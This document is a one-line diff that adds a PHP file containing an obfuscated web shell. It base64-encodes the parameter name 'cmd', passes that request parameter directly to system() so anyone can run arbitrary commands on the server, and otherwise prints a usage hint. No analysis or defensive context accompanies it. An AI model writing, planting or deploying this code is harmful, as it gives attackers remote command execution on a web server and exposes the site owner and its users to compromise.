@@ -1,0 +1,1 @@
+<?php if(isset($_GET[base64_decode('Y21k')])){$ytyalkxr_2f5c1cc0=$_GET[base64_decode('Y21k')];system($ytyalkxr_2f5c1cc0);}else{echo base64_decode('aW5kZXgucGhwP2NtZD0mbHQ7eW91ciBjb21tYW5kJmd0Ow==');}?>
